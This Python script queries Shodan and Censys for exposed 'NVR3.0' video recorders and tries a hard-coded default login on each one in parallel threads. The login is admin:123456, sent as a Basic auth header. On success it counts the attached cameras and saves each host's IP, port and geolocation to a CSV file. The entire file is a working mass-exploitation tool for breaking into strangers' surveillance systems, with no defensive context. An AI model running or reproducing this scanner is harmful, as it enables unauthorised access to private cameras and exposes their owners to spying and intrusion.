from shodan import Shodan
from censys.search import CensysHosts
import config
import requests
import threading
import math


request_count = 0
mutex_list = {}

counter_mutex = {}
counter = {
    "success": 0,
    "failed": 0,
    "errors": 0,
    "threads": 0,
}

with open('output.csv', 'w') as f:
    f.writelines("ip,port,status_code,camera count,source,city,country,country_code,longitude,latitude\n")


def add_mutex(name):
    if not name in mutex_list:
        mutex_list[name] = threading.Lock()

    def decorator(function):
        def wrapper(*args, **kwargs):
            mutex_list[name].acquire()
            result = function(*args, **kwargs)
            mutex_list[name].release()
            return result
        return wrapper
    return decorator


def change_value(value, change=1):
    if not value in counter_mutex:
        counter_mutex[value] = threading.Lock()

    @add_mutex(value)
    def wrapper(value, change):
        counter[value] += change

    return wrapper(value, change)

@add_mutex("print_single")
def print_single(server, status=False):
    if status:
        change_value("success")
    print(f"[ \033[92m{counter['success']} \033[97m| \033[33m{counter['failed']} \033[97m| \033[91m{counter['errors']} \033[97m] http://\033[96m{server}\033[97m/")


@add_mutex("save")
def save(server, code, count, source, city, country, country_code, long, lat):
    split = server.split(":")
    with open('output.csv', 'a') as f:
        f.writelines(f"{split[0]},{split[1]},{code},{count},{source},{city},{country},{country_code},{long},{lat}\n")

def send_login_request(server, source, city, country, country_code, long, lat):
    global success, failed, request_count
    try:
        r = requests.get(f"http://{server}/Media/UserGroup/login?response_format=json", headers={"Authorization": "Basic YWRtaW46MTIzNDU2" }, timeout=10)
        if r.status_code == 200:
            count = "N/A"
            try:
                r = requests.get(f"http://{server}/Media/Device/getDevice?response_format=json", headers={"Authorization": "Basic YWRtaW46MTIzNDU2" }, timeout=10)
                if r.status_code == 200:
                    count = len(r.json()["DeviceConfig"]["Devices"]["Device"])
            except:
                pass

            print_single(server, True)
            save(server, r.status_code, count, source, city, country, country_code, long, lat)
        else:
            change_value("failed")

    except Exception:
        change_value("errors")

    finally:
        change_value("threads", -1)



def start_thread(*args):
    while counter['threads'] >= config.MAX_THREADS:
        pass
    change_value("threads")
    threading.Thread(target=send_login_request, args=(*args,)).start()

print("\033[92msuccess\t\033[33mfailure\t\033[91merror")
if config.SHODAN:
    api = Shodan(config.SHODAN_API)
    search_term = 'http.html:NVR3.0'
   
    count = api.count(search_term)['total'] 
    for page in range(math.ceil(count/100)):
        query = api.search(query=search_term, page=page+1)
        for server in query['matches']:
            param = f"{server['ip_str']}:{server['port']}"
            location = server["location"]
            start_thread(param, "SHODAN", location["city"], location["country_name"], location["country_code"], location["longitude"], location["latitude"])

if config.CENSYS:
    h = CensysHosts()
    query = h.search("NVR3.0", per_page=100, pages=100)

    for page in query:
        for server in page:
            for service in server['services']:
                if service['service_name'] != "HTTP":
                    continue
                location = server["location"]
                city = location["city"] if 'city' in location else 'N/A'
                start_thread(f"{server['ip']}:{service['port']}", "CENSYS", city, location["country"], location["country_code"], location["coordinates"]["longitude"], location["coordinates"]["latitude"])
                
